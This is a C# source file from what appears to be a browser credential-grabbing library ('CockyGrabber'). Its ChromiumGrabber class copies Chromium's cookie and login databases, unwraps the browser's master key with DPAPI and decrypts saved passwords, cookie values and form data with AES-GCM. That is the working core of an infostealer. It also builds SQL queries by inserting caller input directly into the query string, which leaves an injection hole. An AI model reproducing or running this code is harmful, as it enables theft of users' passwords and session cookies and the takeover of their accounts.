using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace CockyGrabber.Grabbers
{
    public class ChromiumGrabber
    {
        private const string CookieCommandText = "SELECT creation_utc,top_frame_site_key,host_key,name,value,encrypted_value,path,expires_utc,is_secure,is_httponly,last_access_utc,has_expires,is_persistent,priority,samesite,source_scheme,source_port,is_same_party FROM cookies";
        private const string LoginCommandText = "SELECT origin_url,action_url,username_element,username_value,password_element,password_value,submit_element,signon_realm,date_created,blacklisted_by_user,scheme,password_type,times_used,form_data,display_name,icon_url,federation_url,skip_zero_click,generation_upload_status,possible_username_pairs,id,date_last_used,moving_blocked_for,date_password_modified FROM logins";
        public virtual string ChromiumBrowserCookiePath { get; set; }
        public virtual string ChromiumBrowserLocalStatePath { get; set; }
        public virtual string ChromiumBrowserLoginDataPath { get; set; }

        #region IO Functions
        /// <summary>
        /// Create a temporary file(path) in %temp%
        /// </summary>
        /// <returns>The path to the temp file</returns>
        private string GetTempFileName() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()); // This is better than Path.GetTempFileName() because GetTempFileName is most of the time inaccurate

        /// <summary>
        /// Returns a value depending on if the database with the stored cookies was found
        /// </summary>
        public bool CookiesExist() => File.Exists(ChromiumBrowserCookiePath);

        /// <summary>
        /// Returns a value depending on if the database with the stored logins was found
        /// </summary>
        public bool LoginsExist() => File.Exists(ChromiumBrowserLoginDataPath);

        /// <summary>
        /// Returns a value depending on if the key for decrypting the cookies was found
        /// </summary>
        public bool KeyExists() => File.Exists(ChromiumBrowserLocalStatePath);
        #endregion

        #region GetCookies()
        public IEnumerable<Chromium.Cookie> GetCookiesBy(Chromium.CookieHeader by, object value) => GetCookiesBy(by, value, GetKey());
        public IEnumerable<Chromium.Cookie> GetCookiesBy(Chromium.CookieHeader by, object value, byte[] key)
        {
            List<Chromium.Cookie> cookies = new List<Chromium.Cookie>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!CookiesExist()) throw new FileNotFoundException($"Program can't find \"{ChromiumBrowserCookiePath}\"", ChromiumBrowserCookiePath); // throw a FileNotFoundException if the Cookie DB was not found

            // Copy the database to a temporary location because it could be already in use
            string tempFile = GetTempFileName();
            File.Copy(ChromiumBrowserCookiePath, tempFile);

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"{CookieCommandText} WHERE {by} = '{value}'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        // Store retrieved information:
                        cookies.Add(new Chromium.Cookie()
                        {
                            CreationUTC = reader.GetInt64(0),
                            TopFrameSiteKey = reader.GetString(1),
                            HostKey = reader.GetString(2),
                            Name = reader.GetString(3),
                            Value = reader.GetString(4),
                            EncryptedValue = DecryptWithKey((byte[])reader[5], key, 3),
                            Path = reader.GetString(6),
                            ExpiresUTC = reader.GetInt64(7),
                            IsSecure = reader.GetBoolean(8),
                            IsHttpOnly = reader.GetBoolean(9),
                            LastAccessUTC = reader.GetInt64(10),
                            HasExpires = reader.GetBoolean(11),
                            IsPersistent = reader.GetBoolean(12),
                            Priority = reader.GetInt16(13),
                            Samesite = reader.GetInt16(14),
                            SourceScheme = reader.GetInt16(15),
                            SourcePort = reader.GetInt32(16),
                            IsSameParty = reader.GetBoolean(17),
                        });
                    }
                }
                conn.Close();
            }
            File.Delete(tempFile);

            return cookies;
        }

        public IEnumerable<Chromium.Cookie> GetCookies() => GetCookies(GetKey());
        public IEnumerable<Chromium.Cookie> GetCookies(byte[] key)
        {
            List<Chromium.Cookie> cookies = new List<Chromium.Cookie>();
            if (!CookiesExist()) throw new FileNotFoundException($"Program can't find \"{ChromiumBrowserCookiePath}\"", ChromiumBrowserCookiePath); // throw a FileNotFoundException if the Cookie DB was not found
            
            // Copy the database to a temporary location because it could be already in use
            string tempFile = GetTempFileName();
            File.Copy(ChromiumBrowserCookiePath, tempFile);

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = CookieCommandText;

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        // Store retrieved information:
                        cookies.Add(new Chromium.Cookie()
                        {
                            CreationUTC = reader.GetInt64(0),
                            TopFrameSiteKey = reader.GetString(1),
                            HostKey = reader.GetString(2),
                            Name = reader.GetString(3),
                            Value = reader.GetString(4),
                            EncryptedValue = DecryptWithKey((byte[])reader[5], key, 3),
                            Path = reader.GetString(6),
                            ExpiresUTC = reader.GetInt64(7),
                            IsSecure = reader.GetBoolean(8),
                            IsHttpOnly = reader.GetBoolean(9),
                            LastAccessUTC = reader.GetInt64(10),
                            HasExpires = reader.GetBoolean(11),
                            IsPersistent = reader.GetBoolean(12),
                            Priority = reader.GetInt16(13),
                            Samesite = reader.GetInt16(14),
                            SourceScheme = reader.GetInt16(15),
                            SourcePort = reader.GetInt32(16),
                            IsSameParty = reader.GetBoolean(17),
                        });
                    }
                }
                conn.Close();
            }
            File.Delete(tempFile);

            return cookies;
        }
        #endregion

        #region GetLogins()
        public IEnumerable<Chromium.Login> GetLoginsBy(Chromium.LoginHeader by, object value) => GetLoginsBy(by, value, GetKey());
        public IEnumerable<Chromium.Login> GetLoginsBy(Chromium.LoginHeader by, object value, byte[] key)
        {
            List<Chromium.Login> password = new List<Chromium.Login>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!LoginsExist()) throw new FileNotFoundException($"Program can't find \"{ChromiumBrowserLoginDataPath}\"", ChromiumBrowserLoginDataPath); // throw a FileNotFoundException if the Login DB was not found

            // Copy the database to a temporary location because it could be already in use
            string tempFile = GetTempFileName();
            File.Copy(ChromiumBrowserLoginDataPath, tempFile);

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"{LoginCommandText} WHERE {by} = '{value}'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        // Store retrieved information:
                        password.Add(new Chromium.Login()
                        {
                            OriginUrl = reader.GetString(0),
                            ActionUrl = reader.GetString(1),
                            UsernameElement = reader.GetString(2),
                            UsernameValue = reader.GetString(3),
                            PasswordElement = reader.GetString(4),
                            PasswordValue = DecryptWithKey((byte[])reader[5], key, 3),
                            SubmitElement = reader.GetString(6),
                            SignonRealm = reader.GetString(7),
                            DateCreated = reader.GetInt64(8),
                            IsBlacklistedByUser = reader.GetBoolean(9),
                            Scheme = reader.GetInt32(10),
                            PasswordType = reader.GetInt32(11),
                            TimesUsed = reader.GetInt32(12),
                            FormData = DecryptWithKey((byte[])reader[13], key, 3),
                            DisplayName = reader.GetString(14),
                            IconUrl = reader.GetString(15),
                            FederationUrl = reader.GetString(16),
                            SkipZeroClick = reader.GetInt32(17),
                            GenerationUploadStatus = reader.GetInt32(18),
                            PossibleUsernamePairs = DecryptWithKey((byte[])reader[19], key, 3),
                            Id = reader.GetInt32(20),
                            DateLastUsed = reader.GetInt64(21),
                            MovingBlockedFor = DecryptWithKey((byte[])reader[22], key, 3),
                            DatePasswordModified = reader.GetInt64(23),
                        });
                    }
                }
                conn.Close();
            }
            File.Delete(tempFile);

            return password;
        }

        public IEnumerable<Chromium.Login> GetLogins() => GetLogins(GetKey());
        public IEnumerable<Chromium.Login> GetLogins(byte[] key)
        {
            List<Chromium.Login> password = new List<Chromium.Login>();
            if (!LoginsExist()) throw new FileNotFoundException($"Program can't find \"{ChromiumBrowserLoginDataPath}\"", ChromiumBrowserLoginDataPath); // throw a FileNotFoundException if the Login DB was not found

            // Copy the database to a temporary location because it could be already in use
            string tempFile = GetTempFileName();
            File.Copy(ChromiumBrowserLoginDataPath, tempFile);

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = LoginCommandText;

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        password.Add(new Chromium.Login()
                        {
                            // Store retrieved information:
                            OriginUrl = reader.GetString(0),
                            ActionUrl = reader.GetString(1),
                            UsernameElement = reader.GetString(2),
                            UsernameValue = reader.GetString(3),
                            PasswordElement = reader.GetString(4),
                            PasswordValue = DecryptWithKey((byte[])reader[5], key, 3),
                            SubmitElement = reader.GetString(6),
                            SignonRealm = reader.GetString(7),
                            DateCreated = reader.GetInt64(8),
                            IsBlacklistedByUser = reader.GetBoolean(9),
                            Scheme = reader.GetInt32(10),
                            PasswordType = reader.GetInt32(11),
                            TimesUsed = reader.GetInt32(12),
                            FormData = DecryptWithKey((byte[])reader[13], key, 3),
                            DisplayName = reader.GetString(14),
                            IconUrl = reader.GetString(15),
                            FederationUrl = reader.GetString(16),
                            SkipZeroClick = reader.GetInt32(17),
                            GenerationUploadStatus = reader.GetInt32(18),
                            PossibleUsernamePairs = DecryptWithKey((byte[])reader[19], key, 3),
                            Id = reader.GetInt32(20),
                            DateLastUsed = reader.GetInt64(21),
                            MovingBlockedFor = DecryptWithKey((byte[])reader[22], key, 3),
                            DatePasswordModified = reader.GetInt64(23),
                        });
                    }
                }
                conn.Close();
            }
            File.Delete(tempFile);

            return password;
        }
        #endregion

        /// <summary>
        /// Returns the key to decrypt encrypted BLOB database values
        /// </summary>
        public byte[] GetKey()
        {
            string encKey = File.ReadAllText(ChromiumBrowserLocalStatePath); // Read file
            encKey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString(); // Get Encrypted key
            return ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine); // Decrypt the encrypted key and return a byte Array
        }

        // undocumented;
        private string DecryptWithKey(byte[] msg, byte[] key, int nonSecretPayloadLength)
        {
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", "key");
            if (msg == null || msg.Length == 0)
                throw new ArgumentException("Message required!", "message");

            using (var cipherStream = new MemoryStream(msg))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
                cipher.Init(false, parameters);
                var cipherText = cipherReader.ReadBytes(msg.Length);
                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
                try
                {
                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
                    cipher.DoFinal(plainText, len);
                }
                catch (InvalidCipherTextException)
                {
                    return null;
                }
                return Encoding.Default.GetString(plainText);
            }
        }
    }
}
